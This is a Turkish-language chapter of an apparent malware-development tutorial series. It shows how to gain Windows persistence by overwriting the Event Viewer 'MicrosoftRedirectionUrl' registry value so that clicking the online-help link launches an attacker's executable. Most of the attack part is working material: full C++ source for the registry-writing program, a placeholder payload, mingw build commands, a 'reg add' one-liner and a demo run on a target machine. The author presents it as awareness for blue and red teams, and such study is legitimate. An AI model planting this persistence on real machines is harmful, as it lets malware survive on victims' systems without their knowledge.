\newpage
\subsection{80. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 14. Olay Görüntüleyici yardım bağlantısı. Basit C++ örneği.}

﷽

![pers](./images/74/2022-10-09_05-28.png){width="80%"}    

Bu gönderi, Windows Olay Görüntüleyicisi yardım bağlantısını değiştirerek kötü amaçlı yazılım kalıcılığı sağlama üzerine yaptığım kendi araştırmamın sonucudur.     

### olay görüntüleyici yardım bağlantısı (event viewer help link)

Windows’un Olay Görüntüleyicisi on yılı aşkın süredir var. Olay Görüntüleyici, bilgisayarınızda Windows’un tuttuğu sınırlı sayıda günlük kaydını inceler. Günlükler, düz içerik içeren `XML` biçimli metin dosyalarıdır.     

![pers](./images/74/2022-10-09_05-10.png){width="80%"}    

Olay Görüntüleyicinin kullanıcı arayüzünün bir parçası olarak, *Olay Günlüğü Çevrimiçi Yardımı* bağlantısı sağlanır:    

![pers](./images/74/2022-10-09_05-11.png){width="80%"}    

Bağlantıya tıklandığında, Windows kayıt defterinde tanımlanan varsayılan bir Microsoft yardım bağlantısı açılır `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer`:     

![pers](./images/74/2022-10-09_05-13.png){width="80%"}    

Tahmin ettiğiniz gibi, `MicrosoftRedirectionURL` anahtarının değerinin bir saldırganın çıkarlarına uygun şekilde değiştirilebileceğini varsaymak mantıklıdır. İşte numara burada.    

### pratik örnek

Hadi pratik bir örneğe bakalım. Öncelikle her zamanki gibi kötü amaçlı uygulamayı oluşturalım, `meow-meow` "malware" (`hack.cpp`):    

```cpp
/*
hack.cpp
evil app for windows persistence via
event viewer help link update
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/09/malware-pers-14.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR 
lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Ardından, kalıcılık için bir program oluşturalım (`pers.cpp`):     

```cpp
/*
pers.cpp
windows persistence via
replace event viewer help link
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/09/malware-pers-14.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // event viewer
  const char* app = 
  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer";

  // evil app
  const char* exe = 
  "file://Z:\\2022-10-09-malware-pers-14\\hack.exe";

  // app
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // update registry key value
    // reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Event 
    // Viewer" /v "MicrosoftRedirectionUrl" /t REG_SZ /d 
    // "file://...\hack.exe" /f
    RegSetValueEx(hkey, (LPCSTR)"MicrosoftRedirectionUrl", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
```

Gördüğünüz gibi, mantık basittir, sadece kayıt defteri anahtarının değerini `file://Z:\2022-10-09-malware-pers-14\hack` olarak günceller.    

### demo

Hadi her şeyi aksiyon halinde görelim. "Kötü amaçlı yazılımı" derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/74/2022-10-09_17-31.png){width="80%"}    

Doğruluğunu kontrol edelim:    

![pers](./images/74/2022-10-09_05-38_1.png){width="80%"}    

ve kalıcılık betiğini derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/74/2022-10-09_05-24.png){width="80%"}    

Hedef makinedeki varsayılan kayıt defteri anahtarlarını kontrol edelim - benim durumumda `Windows 10 x64`:    

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /s
```

![pers](./images/74/2022-10-09_05-25.png){width="80%"}    

Ardından, aynı şekilde hedef makinede çalıştıralım - benim durumumda `Windows 10 x64`:    

```powershell
.\pers.exe
```    

![pers](./images/74/2022-10-09_05-26.png){width="80%"}    
    
Son olarak, *Olay Günlüğü Çevrimiçi Yardımı* (*Event Log Online Help*) bağlantısına tekrar tıklamayı deneyelim:

![pers](./images/74/2022-10-09_05-11.png){width="80%"}    

![pers](./images/74/2022-10-09_05-27.png){width="80%"}    

Ardından, `hack.exe`'nin özelliklerine Process Hacker 2'de baktım:    

![pers](./images/74/2022-10-09_05-34.png){width="80%"}    

![pers](./images/74/2022-10-09_05-30.png){width="80%"}    

Bu, bağlantıya tıklandığında `mmc.exe`'nin başlatıldığını ve bunun da kötü amaçlı davranışı tetiklediğini gösteriyor.    

Deneylerden sonra geri almak için şu komutu çalıştırın:    

```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v 
"MicrosoftRedirectionUrl" /t REG_SZ /d 
"http://go.microsoft.com/fwlink/events.asp" /f
```

![pers](./images/74/2022-10-09_05-38.png){width="80%"}    

veya sanal makineyi geri yükleyin.     

> Bu, yönetici düzeyinde bir kötü amaçlı yazılım kalıcılık tekniğidir, bu nedenle yalnızca yönetici izinleriyle çalışır.       

Bu taktiğin ve tekniğin vahşi doğada herhangi bir APT (Gelişmiş Kalıcı Tehdit) tarafından kullanılıp kullanılmadığını bilmiyorum, ancak bu gönderinin, özellikle yazılım geliştirirken, mavi takım çalışanlarının bu ilginç teknik hakkında farkındalığını artırmasını ve kırmızı takım çalışanlarının cephaneliğine bir silah daha eklemesini umuyorum.    

[Event Viewer](https://learn.microsoft.com/en-us/shows/inside/event-viewer)    
[RegOpenKeyEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa)    
[RegSetValueEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)    
[RegCloseKey](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey)    
[reg query](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)      
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-10-09-malware-pers-14)        
